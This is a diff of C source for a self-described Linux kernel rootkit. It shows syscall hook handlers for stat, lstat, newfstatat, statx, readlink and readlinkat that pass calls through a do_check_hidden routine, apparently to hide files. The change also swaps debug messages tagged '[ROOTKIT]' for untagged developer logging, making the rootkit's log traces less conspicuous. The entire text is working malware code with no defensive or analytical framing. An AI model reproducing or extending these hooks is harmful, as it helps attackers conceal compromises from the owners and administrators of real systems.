@@ -11,7 +11,7 @@
 SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
                       struct stat __user *, p_statbuf)
 {
-    pr_info("[ROOTKIT] stat(%p, %p)\n", s_filename, p_statbuf);
+    pr_dev_info("stat(%p, %p)\n", s_filename, p_statbuf);
 
     return do_check_hidden(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -20,7 +20,7 @@ SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
 SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename,
                       struct stat __user *, p_statbuf)
 {
-    pr_info("[ROOTKIT] lstat(%p, %p)\n", s_filename, p_statbuf);
+    pr_dev_info("lstat(%p, %p)\n", s_filename, p_statbuf);
 
     return do_check_hidden(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
 }
@@ -29,8 +29,8 @@ SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename
 SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, struct stat __user *, p_statbuf, int, i32_flag)
 {
-    pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %s%#x)\n", i32_dfd, s_filename, p_statbuf,
-            SIGNED_ARG(i32_flag));
+    pr_dev_info("newfstatat(%d, %p, %p, %s%#x)\n", i32_dfd, s_filename, p_statbuf,
+                SIGNED_ARG(i32_flag));
 
     return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename, i32_flag);
 }
@@ -40,8 +40,8 @@ SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user
                       unsigned int, ui32_flags, unsigned int, ui32_mask, struct statx __user *,
                       p_buffer)
 {
-    pr_info("[ROOTKIT] statx(%d, %p, %#x, %#x, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
-            p_buffer);
+    pr_dev_info("statx(%d, %p, %#x, %#x, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
+                p_buffer);
 
     return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags);
 }
@@ -50,7 +50,7 @@ SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user
 SYSCALL_HOOK_HANDLER3(readlink, orig_readlink, p_regs, const char __user *, s_path, char __user *,
                       s_buf, int, i32_bufsiz)
 {
-    pr_info("[ROOTKIT] readlink(%p, %p, %d)\n", s_path, s_buf, i32_bufsiz);
+    pr_dev_info("readlink(%p, %p, %d)\n", s_path, s_buf, i32_bufsiz);
 
     return do_check_hidden(orig_readlink, p_regs, AT_FDCWD, s_path, AT_SYMLINK_NOFOLLOW);
 }
@@ -59,7 +59,7 @@ SYSCALL_HOOK_HANDLER3(readlink, orig_readlink, p_regs, const char __user *, s_pa
 SYSCALL_HOOK_HANDLER4(readlinkat, orig_readlinkat, p_regs, int, i32_dfd, const char __user *,
                       s_path, char __user *, s_buf, int, i32_bufsiz)
 {
-    pr_info("[ROOTKIT] readlinkat(%d, %p, %p, %d)\n", i32_dfd, s_path, s_buf, i32_bufsiz);
+    pr_dev_info("readlinkat(%d, %p, %p, %d)\n", i32_dfd, s_path, s_buf, i32_bufsiz);
 
     return do_check_hidden(orig_readlinkat, p_regs, i32_dfd, s_path, AT_SYMLINK_NOFOLLOW);
 }
